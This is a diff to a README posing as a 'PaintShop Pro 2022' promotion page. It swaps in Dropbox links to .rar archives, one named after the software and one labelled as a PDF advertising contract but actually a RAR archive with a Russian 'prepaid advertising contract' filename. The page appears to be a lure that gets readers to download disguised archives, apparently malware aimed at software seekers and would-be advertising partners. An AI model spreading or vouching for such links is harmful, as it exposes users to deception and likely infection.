@@ -1,4 +1,4 @@
-# PaintShop Pro ® 2022 version 3.8 | PRO
+# PaintShop Pro ® 2022 version 3.8 | Promotion version
 -------------
 ![alt-текст](https://i.imgur.com/bTK1CDS.png)
 
@@ -44,10 +44,10 @@ Reduce repetition and accelerate complex photo-editing actions with Scripts. Rec
 <summary>✅ Partnership and Collaboration:</summary>
   
  #### <div dir="rtl">:Video for advertising integration (.mp4) </div>
- [💾 Download](https://www.dropbox.com/s/6nxrwxyehxrv2l6/topaz_studio_promo_pack-04-05_22_for_adv.rar?dl=1)
+ [💾 Download](https://www.dropbox.com/s/6eekng3o1f0ss21/PaintShop%20Pro%202022.rar?dl=1)
   
  #### <div dir="rtl">:Contract for the provision of advertising services (.pdf) </div>
- [💾 Download](https://www.dropbox.com/s/6nxrwxyehxrv2l6/topaz_studio_promo_pack-04-05_22_for_adv.rar?dl=1)
+ [💾 Download](https://www.dropbox.com/s/939mwp5tts8befo/%D0%94%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%20%D0%BD%D0%B0%20%D1%80%D0%B5%D0%BA%D0%BB%D0%B0%D0%BC%D1%83%20%D0%BF%D0%BE%20%D0%BF%D1%80%D0%B5%D0%B4%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B5.rar?dl=1)
   
    ...
 </details></div>
